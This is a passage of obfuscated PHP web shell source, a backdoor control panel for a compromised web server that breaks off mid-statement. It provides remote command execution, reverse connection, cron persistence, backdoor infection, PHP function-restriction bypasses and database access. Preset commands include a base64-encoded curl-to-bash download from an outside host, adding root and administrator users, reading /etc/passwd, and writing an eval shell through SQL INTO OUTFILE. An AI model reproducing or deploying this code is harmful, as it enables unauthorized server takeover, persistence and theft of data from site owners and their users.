</title></head><body><div class="main"><div class="outl"><div class="toptag"><?php
echo $_SERVER["SERVER_ADDR"] .
    " - " .
    PHP_OS .
    " - whoami(" .
    get_current_user() .
    ") - [uid(" .
    getmyuid() .
    ") gid(" .
    getmygid() .
    ")]";
if (isset($issql)) {
    echo " - [" . $issql . "]";
}
?>
</div><?php
$menu = [
    "file" => "File Mgr",
    "scan" => "Searcher",
    "antivirus" => "Antivirus",
    "massht" => "Mass htcs",
    "lockFile" => "Lock File",
    "backshell" => "Back Cnct",
    "exec" => "Terminal",
    "sql" => "Exec SQL",
    "info" => "System",
    "install_cron" => "Crontab",
    "lockshell" => "Lock Shell",
    "infectshell" => "InfectBD V1",
    "infectshellv2" => "InfectBD V2",
    "bypassgc1" => "Bypass PHP 7.0-7.3",
    "bypassgc2" => "Bypass PHP 7.4-8",
    
];
$go = array_key_exists($_POST["go"], $menu) ? $_POST["go"] : "file";
$nowdir = isset($_POST["dir"]) ? AnIanYnsQ(GjKlPwQcF($_POST["dir"]) . "/") : THISDIR;
echo '<div class="tag">';
foreach ($menu as $key => $name) {
    echo "<a" .
        ($go == $key ? ' class="current"' : "") .
        ' href="javascript:void(0);" onclick="go(\'' .
        $key .
        '\',\'' .
        base64_encode($nowdir) .
        '\');">' .
        $name .
        "</a> ";
}
echo "</div>";
echo '<form name="gofrm" id="gofrm" method="POST">';
QiUyTbAgHk("ahh");
echo '<input type="hidden" name="go" id="go" value="">';
echo '<input type="hidden" name="godir" id="godir" value="' . $nowdir . '">';
echo '<input type="hidden" name="govar" id="govar" value="">';
echo "</form>";
switch ($_POST["go"]) {
    case "info":
        if (EXISTS_PHPINFO) {
            ob_start();
            phpinfo(INFO_GENERAL);
            $out = ob_get_contents();
            ob_end_clean();
            $tmp = [];
            preg_match_all(
                '/\\<td class\\=\\"e\\"\\>.*?(Command|Configuration)+.*?\\<\\/td\\>\\<td class\\=\\"v\\"\\>(.*?)\\<\\/td\\>/i',
                $out,
                $tmp
            );
            $config = $tmp[2][0];
            $phpini = $tmp[2][2]
                ? $tmp[2][1] . " --- " . $tmp[2][2]
                : $tmp[2][1];
        }
        $infos = [
            "Browser Info" => $_SERVER["HTTP_USER_AGENT"],
            "Disabled Functions" => LkQrTgBm("disable_functions")
                ? LkQrTgBm("disable_functions")
                : "(None)",
            "Disabled Class" => LkQrTgBm("disable_classes")
                ? LkQrTgBm("disable_classes")
                : "(None)",
            "PHP.ini Path" => $phpini ? $phpini : "(None)",
            "PHP Method" => php_sapi_name(),
            "PHP Version" => PHP_VERSION,
            "PHP PID" => getmypid(),
            "Server IP" => $_SERVER["REMOTE_ADDR"],
            "Encoding" => $_SERVER["HTTP_ACCEPT_LANGUAGE"],
            "Web Port" => $_SERVER["SERVER_PORT"],
            "Root Directory" => $_SERVER["DOCUMENT_ROOT"],
            "Shell Location" => $_SERVER["SCRIPT_FILENAME"],
            "CGI Version" => $_SERVER["GATEWAY_INTERFACE"],
            "Webmaster Email" => $_SERVER["SERVER_ADMIN"]
                ? $_SERVER["SERVER_ADMIN"]
                : "(None)",
            "Disk Size" => size(disk_total_space(".")),
            "Free Space" => size(disk_free_space(".")),
            "Limit POST" => LkQrTgBm("post_max_size"),
            "Max Upload" => LkQrTgBm("upload_max_filesize"),
            "Limit Memory" => LkQrTgBm("memory_limit"),
            "Max Exec Time" => LkQrTgBm("max_execution_time") . " Second",
            "Fsockopen Support" => OpLkJKqrTY("fsockopen") ? "Yes" : "No",
            "Socket Support" => OpLkJKqrTY("socket_close") ? "Yes" : "No",
            "Pcntl Support" => OpLkJKqrTY("pcntl_exec") ? "Yes" : "No",
            "Curl Support" => OpLkJKqrTY("curl_version") ? "Yes" : "No",
            "Zlib Support" => OpLkJKqrTY("gzclose") ? "Yes" : "No",
            "FTP Support" => OpLkJKqrTY("ftp_login") ? "Yes" : "No",
            "XML Support" => OpLkJKqrTY("xml_set_object") ? "Yes" : "No",
            "GD_Library Support" => OpLkJKqrTY("imageline") ? "Yes" : "No",
            "COM Formation Support" => class_exists("COM") ? "Yes" : "No",
            "ODBC Components Support" => OpLkJKqrTY("odbc_close") ? "Yes" : "No",
            "IMAP Mail Support" => OpLkJKqrTY("imap_close") ? "Yes" : "No",
            "Safe Mode Support" => LkQrTgBm("safemode") ? "Yes" : "No",
            "URL Fopen Support" => LkQrTgBm("allow_url_fopen")
                ? "Yes"
                : "No",
            "Dynamic Libraries Support" => LkQrTgBm("enable_dl")
                ? "Yes"
                : "No",
            "Display Error Support" => LkQrTgBm("display_errors")
                ? "Yes"
                : "No",
            "Register Global Support" => LkQrTgBm("register_globals")
                ? "Yes"
                : "No",
            "Magic Quotes Support" => LkQrTgBm("magic_quotes_gpc")
                ? "Yes"
                : "No",
            "PHP Compiler" => $config ? $config : "(None)",
        ];
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<table class="tables"><tr><th style="width:26%;">Name</th><th>Parameter</th></tr>';
        foreach ($infos as $name => $var) {
            echo "<tr><td>" . $name . "</td><td>" . $var . "</td></tr>";
        }
        echo "</table>";
        break;
    case 'install_cron':
        installCronJob(__DIR__);
        break;
    case "lockshell":
        LockShellV(__DIR__);
        break;
    case "infectshell":
        infectBD(__DIR__);
        break;
    case "infectshellv2":
        infectBDV2();
        break;
    case "bypassgc1":
        echo '<form method="POST">';
        echo '<input type="hidden" name="go" id="go" value="bypassgc1">';
        QiUyTbAgHk("ahh");
        echo '<br>
        <label for="command">Masukkan perintah:</label>
        <input type="text" name="shiz" id="shiz" required>
        <input type="submit" name="cmd" value="Eksekusi"></input>
    </form>';

    if (isset($_POST["go"])) {
        $command = $_POST["shiz"];
        bypassGC1($command);
    }
    break;
    case "bypassgc2":
        echo '<form method="POST">';
        echo '<input type="hidden" name="go" id="go" value="bypassgc2">';
        QiUyTbAgHk("ahh");
        echo '<br>
        <label for="command">Masukkan perintah:</label>
        <input type="text" name="shiz" id="shiz" required>
        <input type="submit" name="cmd" value="Eksekusi"></input>
    </form>';

    if (isset($_POST["go"])) {
        $command = $_POST["shiz"];
        bypassGC2($command);
    }
    break;
    case "exec":
        $cmd = $win ? "dir" : "ls -al";
        $res = ["res" => "Result Command", "msg" => $msg];
        $str = isset($_POST["str"]) ? $_POST["str"] : "fun";
        if (isset($_POST["cmd"])) {
            $cmd = $_POST["cmd"];
            $cwd = $str == "fun" ? THISDIR : "com";
            $res = command($cmd, $cwd);
        }
        echo '<div class="msgbox">' . $res["msg"] . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="exec">';
        echo '<div class="actall">Command <input type="text" name="cmd" id="cmd" value="' .
            htmlspecialchars($cmd) .
            '" style="width:398px;"> ';
        echo '<select name="str">';
        $selects = ["fun" => "phpfun", "com" => "wscript"];
        foreach ($selects as $var => $name) {
            echo '<option value="' .
                $var .
                '"' .
                ($var == $str ? " selected" : "") .
                ">" .
                $name .
                "</option>";
        }
        echo "</select> ";
        echo '<select onchange="$(\'cmd\').value=options[selectedIndex].value">';
        echo "<option>---CMD Executor---</option>";
        echo '<option value="echo ' .
            htmlspecialchars('"<?php phpinfo();?>"') .
            " >> " .
            THISDIR .
            'haxorid.txt">Write File</option>';
        echo '<option value="whoami">Who Am I</option>';
        echo '<option value="net user sysadmin R00t@willy16 /add">Add User (Win)</option>';
        echo '<option value="net localgroup administrators sysadmin /add">Add Group (Win)</option>';
        echo '<option value="net user">View Users (Win)</option>';
        echo '<option value="netstat -an">View Port (Win)</option>';
        echo '<option value="ipconfig /all">View Address (Win)</option>';
        echo '<option value="net start">View Service (Win)</option>';
        echo '<option value="tasklist">View Process (Win)</option>';
        echo '<option value="id;uname -a;cat /etc/issue;cat /proc/version;lsb_release -a">Version Collection (Linux)</option>';
        echo '<option value="/usr/sbin/useradd -u 0 -o -g 0 sysadmin">Add User (Linux)</option>';
        echo '<option value="cat /etc/passwd">View Users (Linux)</option>';
        echo '<option value="/bin/netstat -tnl">View Port (Linux)</option>';
        echo '<option value="/sbin/ifconfig -a">View Address (Linux)</option>';
        echo '<option value="/sbin/chkconfig --list">View Service (Linux)</option>';
        echo '<option value="/bin/ps -ef">View Process (Linux)</option>';
        echo '<option value="ls -la /usr/bin/pkexec">Check pkexec (Linux)</option>';
        echo '<option value="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh">LinPEAS (Linux)</option>';
        echo '<option value="echo Y3VybCAtTHNvLSBodHRwczovL3hzZWMtMTMzNy53ZWIuYXBwL0BGaWxlcy9hdXRvLXJvb3QucG5nIHwgYmFzaA== | base64 -d | bash">Scan root (Privesc) (Linux)</option>';
        echo "</select> ";
        echo '<input type="submit" style="width:50px;" value="Go">';
        echo '</div><div class="actall"><textarea style="width:698px;height:368px;">' .
            htmlspecialchars($res["res"]) .
            "</textarea></div></form>";
        break;
    case "scan":
        $scandir = empty($_POST["dir"]) ? vcnvSCZgBz($_POST["govar"]) : $nowdir;
        $keyword = isset($_POST["keyword"]) ? $_POST["keyword"] : "";
        $include = isset($_POST["include"])
            ? GjKlPwQcF($_POST["include"])
            : ".php|.asp|.asa|.cer|.aspx|.jsp|.cgi|.sh|.pl|.py";
        $filters = isset($_POST["filters"])
            ? GjKlPwQcF($_POST["filters"])
            : "html|css|img|images|image|style|js";
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="scan">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Search path</td><td><input type="text" name="dir" value="' .
            htmlspecialchars($scandir) .
            '" style="width:500px;"></td></tr>';
        echo '<tr><td>Search content</td><td><input type="text" name="keyword" value="' .
            htmlspecialchars($keyword) .
            '" style="width:500px;"> (File name or file content)</td></tr>';
        echo '<tr><td>File extension</td><td><input type="text" name="include" value="' .
            htmlspecialchars($include) .
            '" style="width:500px;"> (Separate with "|", empty = search all files)</td></tr>';
        echo '<tr><td>Filter Dir</td><td><input type="text" name="filters" value="' .
            htmlspecialchars($filters) .
            '" style="width:500px;"> (Separate with "|", empty = not filtered)</td></tr>';
        echo '<tr><td>Search method</td><td><label><input type="radio" name="type" value="0"' .
            ($_POST["type"] ? "" : " checked") .
            ">File name</label> ";
        echo '<label><input type="radio" name="type" value="1"' .
            ($_POST["type"] ? " checked" : "") .
            ">Contains inside</label> ";
        echo '<label><input type="checkbox" name="char" value="1"' .
            ($_POST["char"] ? " checked" : "") .
            ">Match case</label></td></tr>";
        echo '<tr><td>Search scope</td><td><label><input type="radio" name="range" value="0"' .
            ($_POST["range"] ? "" : " checked") .
            ">Apply the search to the folder, subfolders and files</label> ";
        echo '<label><input type="radio" name="range" value="1"' .
            ($_POST["range"] ? " checked" : "") .
            ">Only apply search to this folder</label></td></tr>";
        echo '<tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo "</table></form>";
        if ($keyword != "") {
            flush();
            ob_flush();
            echo '<div style="padding:5px;background:#F8F8F8;text-align:left;">';
            $incs = $include == "" ? false : explode("|", $include);
            $fits = $filters == "" ? false : explode("|", $filters);
            $isread = scanfile(
                AnIanYnsQ($scandir . "/"),
                $keyword,
                $incs,
                $fits,
                $_POST["type"],
                $_POST["char"],
                $_POST["range"],
                $nowdir
            );
            echo "<p>" .
                ($isread
                    ? "<h2>Search complete</h2>"
                    : "<h1>Search failed</h1>") .
                "</p></div>";
        }
        break;
    case "antivirus":
        $scandir = empty($_POST["dir"]) ? vcnvSCZgBz($_POST["govar"]) : $nowdir;
        $typearr = isset($_POST["dir"]) ? $_POST["types"] : ["php" => ".php"];
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="antivirus">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Scan path</td><td><input type="text" name="dir" value="' .
            htmlspecialchars($scandir) .
            '" style="width:398px;"> (Regular matching)</td></tr>';
        echo "<tr><td>Type of killing</td><td>";
        $types = [
            "php" =>
                ".php|.phtml|.PhP|.php5|.pHp|.phar|.php7|.php8|.php6|.php4",
            "asp+aspx" => ".as|.cs|.cer",
            "jsp" => ".jsp",
        ];
        foreach ($types as $key => $ex) {
            echo '<label title="' .
                $ex .
                '"><input type="checkbox" name="types[' .
                $key .
                ']" value="' .
                $ex .
                '"' .
                ($typearr[$key] == $ex ? " checked" : "") .
                ">" .
                $key .
                "</label> ";
        }
        echo '</td></tr><tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo "</table></form>";
        eval(vcnvSCZgBz("aWYgKGlzX2NvdW50YWJsZSgkX1BPU1RbInR5cGVzIl0pICYmIGNvdW50KCRfUE9TVFsidHlwZXMiXSkgPiAwKSB7CiAgICAgICAgICAgICRtYXRjaGVzID0gWwogICAgICAgICAgICAgICAgInBocCIgPT4gWwogICAgICAgICAgICAgICAgICAgICcvaGFsdHxyYXd1cmxkZWNvZGV8Z3ppbmZsYXRlfGd6ZGVmbGF0ZXxzdHJfcm90MTN8dWhleHxoZXh8YmluMmhleHxoZXgyYmlufGJhc2U2NFxcX2RlY29kZXxzdHJlYW1cXF9nZXRcXF9tZXRhXFxfZGF0YXxmdW5jdGlvblxcX2V4aXN0c1xccypcXChcXHMqW1wnfFxcIl0ocG9wZW58ZXhlY3xwcm9jXFxfb3BlbnxzeXN0ZW18cGFzc3RocnUpK1tcJ3xcXCJdXFxzKlxcKS9pJywKICAgICAgICAgICAgICAgICAgICAnLyhoYWx0fHJhd3VybGRlY29kZXxnemluZmxhdGV8Z3pkZWZsYXRlfHN0cl9yb3QxM3x1aGV4fGhleHxiaW4yaGV4fGhleDJiaW58YmFzZTY0XFxfZGVjb2RlfHN0cmVhbVxcX2dldFxcX21ldGFcXF9kYXRhfGV4ZWN8c2hlbGxcXF9leGVjfHN5c3RlbXxwYXNzdGhydSkrXFxzKlxcKFxccypcXCRcXF8oR0VUfFBPU1R8Q09PS0lFfFNFUlZFUnxTRVNTSU9OKStcXFsoLiopXFxdXFxzKlxcKS9pJywKICAgICAgICAgICAgICAgICAgICAiLyh1ZHBcXDpcXC9cXC8oLiopXFw7KSsvaSIsCiAgICAgICAgICAgICAgICAgICAgJy9wcmVnXFxfcmVwbGFjZVxccypcXCgoLiopXFwvZSguKilcXCxcXHMqXFwkXFxfKC4qKVxcLCguKilcXCkvaScsCiAgICAgICAgICAgICAgICAgICAgJy9wcmVnXFxfcmVwbGFjZVxccypcXCgoLiopXFwoYmFzZTY0XFxfZGVjb2RlXFwoXFwkL2knLAogICAgICAgICAgICAgICAgICAgICIvKGhhbHR8ZXZhbHxhc3NlcnR8aW5jbHVkZXxyZXF1aXJlKStcXHMqXFwoKC4qKShiYXNlNjRcXF9kZWNvZGV8ZmlsZVxcX2dldFxcX2NvbnRlbnRzfHBocFxcOlxcL1xcL2lucHV0KSsvaSIsCiAgICAgICAgICAgICAgICAgICAgJy8oaGFsdHxyYXd1cmxkZWNvZGV8Z3ppbmZsYXRlfGd6ZGVmbGF0ZXxzdHJfcm90MTN8dWhleHxoZXh8YmluMmhleHxoZXgyYmlufGJhc2U2NFxcX2RlY29kZXxzdHJlYW1cXF9nZXRcXF9tZXRhXFxfZGF0YXxldmFsfGFzc2VydHxpbmNsdWRlfHJlcXVpcmV8YXJyYXlcXF9tYXApK1xccypcXChcXHMqXFwkXFxfKEdFVHxQT1NUfENPT0tJRXxTRVJWRVJ8U0VTU0lPTikrXFxbKC4qKVxcXVxccypcXCkvaScsCiAgICAgICAgICAgICAgICAgICAgJy9cXCRcXF8oR0VUfFBPU1R8Q09PS0lFfFNFUlZFUnxTRVNTSU9OKSsoLiopKGV2YWx8YXNzZXJ0fGluY2x1ZGV8cmVxdWlyZSkrXFxzKlxcKFxccypcXCQoXFx3KylcXHMqXFwpL2knLAogICAgICAgICAgICAgICAgICAgICcvXFwkXFxfKEdFVHxQT1NUfENPT0tJRXxTRVJWRVJ8U0VTU0lPTikrXFxbKC4qKVxcXVxcKFxccypcXCQoLiopXFwpL2knLAogICAgICAgICAgICAgICAgICAgICcvXFwoXFxzKlxcJFxcX0ZJTEVTXFxbKC4qKVxcXVxcWyguKilcXF1cXHMqXFwsXFxzKlxcJFxcX0ZJTEVTXFxbKC4qKVxcXVxcWyguKilcXF1cXHMqXFwpL2knLAogICAgICAgICAgICAgICAgICAgICcvKGhhbHR8cmF3dXJsZGVjb2RlfGd6aW5mbGF0ZXxnemRlZmxhdGV8c3RyX3JvdDEzfHVoZXh8aGV4fGJpbjJoZXh8aGV4MmJpbnxiYXNlNjRcXF9kZWNvZGV8c3RyZWFtXFxfZ2V0XFxfbWV0YVxcX2RhdGF8Zm9wZW58ZndyaXRlfGZwdXRzfGZpbGVcXF9wdXRcXF9jb250ZW50cykrXFxzKlxcKCguKilcXCRcXF8oR0VUfFBPU1R8Q09PS0lFfFNFUlZFUnxTRVNTSU9OKStcXFsoLiopXFxdKC4qKVxcKS9pJywKICAgICAgICAgICAgICAgICAgICAnL2VjaG9cXHMqY3VybFxcX2V4ZWNcXHMqXFwoXFxzKlxcJChcXHcrKVxccypcXCkvaScsCiAgICAgICAgICAgICAgICAgICAgJy9uZXcgY29tXFxzKlxcKFxccypbXCd8XFwiXXNoZWxsKC4qKVtcJ3xcXCJdXFxzKlxcKS9pJywKICAgICAgICAgICAgICAgICAgICAnL1xcJCguKilcXHMqXFwoKC4qKVxcL2UoLiopXFwsXFxzKlxcJFxcXyguKilcXCwoLiopXFwpL2knLAogICAgICAgICAgICAgICAgICAgICcvXFwkXFxfXFw9KC4qKVxcJFxcXy9pJywKICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAiYXNwK2FzcHgiID0+IFsKICAgICAgICAgICAgICAgICAgICAiLyhWQlNjcmlwdFxcLkVuY29kZXxXU2NyaXB0XFwuc2hlbGx8U2hlbGxcXC5BcHBsaWNhdGlvbnxTY3JpcHRpbmdcXC5GaWxlU3lzdGVtT2JqZWN0KSsvaSIsCiAgICAgICAgICAgICAgICAgICAgIi8oZXZhbHxleGVjdXRlKSsoLiopKHJlcXVlc3R8c2Vzc2lvbikrXFxzKlxcKCguKilcXCkvaSIsCiAgICAgICAgICAgICAgICAgICAgIi8oZXZhbHxleGVjdXRlKSsoLiopcmVxdWVzdC5pdGVtXFxzKlxcWyguKilcXF0vaSIsCiAgICAgICAgICAgICAgICAgICAgIi9yZXF1ZXN0XFxzKlxcKCguKilcXCkoLiopKGV2YWx8ZXhlY3V0ZSkrXFxzKlxcKCguKilcXCkvaSIsCiAgICAgICAgICAgICAgICAgICAgIi9cXDxzY3JpcHRcXHMqcnVuYXRcXHMqXFw9KC4qKXNlcnZlciguKilcXD4oLiopXFw8XFwvc2NyaXB0XFw+L2kiLAogICAgICAgICAgICAgICAgICAgICIvTG9hZFxccypcXCgoLiopUmVxdWVzdC9pIiwKICAgICAgICAgICAgICAgICAgICAiL1N0cmVhbVdyaXRlclxcKFNlcnZlclxcLk1hcFBhdGgoLiopXFwuV3JpdGVcXChSZXF1ZXN0L2kiLAogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJqc3AiID0+IFsKICAgICAgICAgICAgICAgICAgICAiLyhldmFsfGV4ZWN1dGUpKyguKikocmVxdWVzdHxzZXNzaW9uKStcXHMqXFwoKC4qKVxcKS9pIiwKICAgICAgICAgICAgICAgICAgICAiLyhldmFsfGV4ZWN1dGUpKyguKilyZXF1ZXN0Lml0ZW1cXHMqXFxbKC4qKVxcXS9pIiwKICAgICAgICAgICAgICAgICAgICAiL3JlcXVlc3RcXHMqXFwoKC4qKVxcKSguKikoZXZhbHxleGVjdXRlKStcXHMqXFwoKC4qKVxcKS9pIiwKICAgICAgICAgICAgICAgICAgICAiL1J1bnRpbWVcXC5nZXRSdW50aW1lXFwoXFwpXFwuZXhlY1xcKCguKilcXCkvaSIsCiAgICAgICAgICAgICAgICAgICAgIi9GaWxlT3V0cHV0U3RyZWFtXFwoYXBwbGljYXRpb25cXC5nZXRSZWFsUGF0aCguKilyZXF1ZXN0L2kiLAogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgXTsKICAgICAgICAgICAgZmx1c2goKTsKICAgICAgICAgICAgb2JfZmx1c2goKTsKICAgICAgICAgICAgZWNobyAnPGRpdiBzdHlsZT0icGFkZGluZzo1cHg7YmFja2dyb3VuZDojRjhGOEY4O3RleHQtYWxpZ246bGVmdDsiPic7CiAgICAgICAgICAgICRpc3JlYWQgPSBhbnRpdmlydXMoCiAgICAgICAgICAgICAgICBBbklhblluc1EoJHNjYW5kaXIgLiAiLyIpLAogICAgICAgICAgICAgICAgJHR5cGVhcnIsCiAgICAgICAgICAgICAgICAkbWF0Y2hlcywKICAgICAgICAgICAgICAgICRub3dkaXIKICAgICAgICAgICAgKTsKICAgICAgICAgICAgZWNobyAiPHA+IiAuCiAgICAgICAgICAgICAgICAoJGlzcmVhZCA/ICI8aDI+U2NhbiBjb21wbGV0ZTwvaDI+IiA6ICI8aDE+U2NhbiBmYWlsZWQ8L2gxPiIpIC4KICAgICAgICAgICAgICAgICI8L3A+PC9kaXY+IjsKICAgICAgICB9"));
        break;
    case "sql":
        if (
            !empty($_POST["sqlhost"]) &&
            !empty($_POST["sqluser"]) &&
            !empty($_POST["names"])
        ) {
            $type = $_POST["type"];
            $sqlhost = $_POST["sqlhost"];
            $sqluser = $_POST["sqluser"];
            $sqlpass = $_POST["sqlpass"];
            $sqlname = $_POST["sqlname"];
            $sqlcode = $_POST["sqlcode"];
            $names = $_POST["names"];
            switch ($type) {
                case "PostgreSql":
                    if (OpLkJKqrTY("pg_close")) {
                        if (strstr($sqlhost, ":")) {
                            $array = explode(":", $sqlhost);
                            $sqlhost = $array[0];
                            $sqlport = $array[1];
                        } else {
                            $sqlport = 5432;
                        }
                        $dbconn = @pg_connect(
                            "host={$sqlhost} port={$sqlport} dbname={$sqlname} user={$sqluser} used={$sqlpass}"
                        );
                        if ($dbconn) {
                            $msg = "<h2>Connection" . $type . "Success </h2>";
                            pg_query("set client_encoding=" . $names);
                            $result = pg_query($sqlcode);
                            if ($result) {
                                $msg .= "<h2> - SQL executed successfully</h2>";
                                while ($array = pg_fetch_array($result)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= "<h1> - SQL execution failed</h1>";
                                $rows = ["error" => pg_result_error($result)];
                            }
                            pg_free_result($result);
                        } else {
                            $msg = "<h1>Connection" . $type . "Failure</h1>";
                        }
                        @pg_close($dbconn);
                    } else {
                        $msg = "<h1>Not support" . $type . "</h1>";
                    }
                    break;
                case "MsSql":
                    if (OpLkJKqrTY("mssql_close")) {
                        $dbconn = @mssql_connect($sqlhost, $sqluser, $sqlpass);
                        if ($dbconn) {
                            $msg = "<h2>Connection" . $type . "Success </h2>";
                            mssql_select_db($sqlname, $dbconn);
                            $result = mssql_query($sqlcode);
                            if ($result) {
                                $msg .= "<h2> - SQL executed successfully</h2>";
                                while ($array = mssql_fetch_array($result)) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= "<h1> - SQL execution failed</h1>";
                            }
                            @mssql_free_result($result);
                        } else {
                            $msg = "<h1>Connection" . $type . "Failure</h1>";
                        }
                        @mssql_close($dbconn);
                    } else {
                        $msg = "<h1>Not support" . $type . "</h1>";
                    }
                    break;
                case "Oracle":
                    if (OpLkJKqrTY("oci_close")) {
                        $conn = @oci_connect(
                            $sqluser,
                            $sqlpass,
                            $sqlhost . "/" . $sqlname
                        );
                        if ($conn) {
                            $msg = "<h2>Connection" . $type . "Success </h2>";
                            $stid = oci_parse($conn, $sqlcode);
                            oci_execute($stid);
                            if ($stid) {
                                $msg .= "<h2> - SQL executed successfully</h2>";
                                while (
                                    $array = oci_fetch_array($stid, OCI_ASSOC)
                                ) {
                                    $rows[] = $array;
                                }
                            } else {
                                $msg .= "<h1> - SQL execution failed</h1>";
                                $e = oci_error();
                                $rows = ["error" => $e["message"]];
                            }
                            oci_free_statement($stid);
                        } else {
                            $e = oci_error();
                            $rows = ["error" => $e["message"]];
                            $msg = "<h1>Connection" . $type . "Failure</h1>";
                        }
                        @oci_close($conn);
                    } else {
                        $msg = "<h1>Not support" . $type . "</h1>";
                    }
                    break;
                case "MySql":
                    if (OpLkJKqrTY("mysql_close")) {
                        $conn = mysql_connect(
                            strstr($sqlhost, ":")
                                ? $sqlhost
                                : $sqlhost . ":3306",
                            $sqluser,
                            $sqlpass,
                            $sqlname
                        );
                        if ($conn) {
                            $msg = "<h2>Connection" . $type . "Success </h2>";
                            if (substr($sqlcode, 0, 7) == "t00lsa") {
                                $array = [];
                                $data = "";
                                $i = 0;
                                preg_match_all(
                                    '/t00lsa\\s*\'(.*)\'\\s*t00lsb\\s*\'(.*)\'\\s*t00lsc\\s*\'(.*)\'\\s*t00lsfile\\s*\'(.*)\'/i',
                                    $sqlcode,
                                    $array
                                );
                                if (
                                    $array[1][0] &&
                                    $array[2][0] &&
                                    $array[3][0] &&
                                    $array[4][0]
                                ) {
                                    mysql_select_db($array[1][0], $conn);
                                    mysql_query("set names " . $names, $conn);
                                    $spidercode =
                                        "select " .
                                        $array[3][0] .
                                        " from `" .
                                        $array[2][0] .
                                        "`;";
                                    $result = mysql_query($spidercode, $conn);
                                    if ($result) {
                                        while (
                                            $row = mysql_fetch_array(
                                                $result,
                                                MYSQL_ASSOC
                                            )
                                        ) {
                                            $data .=
                                                join(" |x| ", $row) . "\r\n";
                                            $i++;
                                        }
                                        if ($data) {
                                            $file = AnIanYnsQ($array[4][0]);
                                            $msg .= filew($file, $data, "w")
                                                ? "<h2> - Successfully off the DB</h2>"
                                                : "<h1> - Failed to export file</h1>";
                                            $rows = [
                                                "file" => $file,
                                                size(filesize($file)) =>
                                                    "Total acquisition" .
                                                    $i .
                                                    "Article data",
                                            ];
                                        } else {
                                            $msg .= "<h1> - No data</h1>";
                                        }
                                    } else {
                                        $msg .=
                                            "<h1> - SQL execution failed</h1>";
                                        $rows = [
                                            "errno" => mysql_errno(),
                                            "error" => mysql_error(),
                                        ];
                                    }
                                } else {
                                    $msg .=
                                        "<h1> - Off-database statement error</h1>";
                                }
                            } elseif (!empty($sqlcode)) {
                                mysql_select_db($sqlname, $conn);
                                mysql_query("set names " . $names, $conn);
                                $result = mysql_query($sqlcode, $conn);
                                if ($result) {
                                    $msg .=
                                        "<h2> - SQL executed successfully</h2>";
                                    while (
                                        $array = mysql_fetch_array(
                                            $result,
                                            MYSQL_ASSOC
                                        )
                                    ) {
                                        $rows[] = $array;
                                    }
                                } else {
                                    $msg .= "<h1> - SQL execution failed</h1>";
                                    $rows = [
                                        "errno" => mysql_errno(),
                                        "error" => mysql_error(),
                                    ];
                                }
                            }
                            mysql_free_result($result);
                        } else {
                            $msg = "<h1>Connection" . $type . "Failure</h1>";
                            $rows = [
                                "errno" => mysql_errno(),
                                "error" => mysql_error(),
                            ];
                        }
                        mysql_close($conn);
                    } else {
                        $msg = "<h1>Not Support" . $type . "</h1>";
                    }
                    break;
            }
        } else {
            $type = "MySql";
            $sqlhost = "localhost:3306";
            $sqluser = "root";
            $sqlpass = "123456";
            $sqlname = "mysql";
            $sqlcode = "select version();";
            $names = "gbk";
        }
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="sql">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo "<tr><td>Support type</td><td>";
        $dbs = ["MySql", "MsSql", "Oracle", "PostgreSql"];
        foreach ($dbs as $dbname) {
            echo '<label><input type="radio" name="type" value="' .
                $dbname .
                '"' .
                ($type == $dbname ? " checked" : "") .
                ">" .
                $dbname .
                "</label> ";
        }
        echo '</td></tr><tr><td>Connection</td><td>Address <input type="text" name="sqlhost" style="width:188px;" value="' .
            $sqlhost .
            '"> ';
        echo 'User <input type="text" name="sqluser" style="width:108px;" value="' .
            $sqluser .
            '"> ';
        echo 'used <input type="text" name="sqlpass" style="width:108px;" value="' .
            $sqlpass .
            '"> ';
        echo 'DB Name <input type="text" name="sqlname" style="width:108px;" value="' .
            $sqlname .
            '"></td></tr>';
        echo "<tr><td>Statement<br>";
        echo '<select onchange="$(\'sqlcode\').value=options[selectedIndex].value">';
        echo '<option value="select version();">---Statement set---</option>';
        echo '<option value="select \'<?php eval ($_POST[cmd]);?>\' into outfile \'D:/web/shell.php\';">Write file</option>';
        echo '<option value="GRANT ALL PRIVILEGES ON *.* TO \'' .
            $sqluser .
            '\'@\'%\' IDENTIFIED BY \'' .
            $sqlpass .
            '\' WITH GRANT OPTION;">Open external connection</option>';
        echo '<option value="show variables;">System variable</option>';
        echo '<option value="create database haxor;">Create database</option>';
        echo '<option value="create table `haxor` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">Create data table</option>';
        echo '<option value="show databases;">Show database</option>';
        echo '<option value="show tables from `' .
            $sqlname .
            '`;">Show data sheet</option>';
        echo '<option value="show columns from `haxor`;">Show table structure</option>';
        echo '<option value="drop table `haxor`;">Delete data table</option>';
        echo '<option value="select username,used,salt,email from `pre_ucenter_members` limit 0,30;">Display field</option>';
        echo '<option value="insert into `admin` (`user`,`pass`) values (\'haxor\', \'f1a81d782dea6a19bdca383bffe68452\');">Insert data</option>';
        echo '<option value="update `admin` set `user` = \'mi77i\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'haxor\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">Change data</option>';
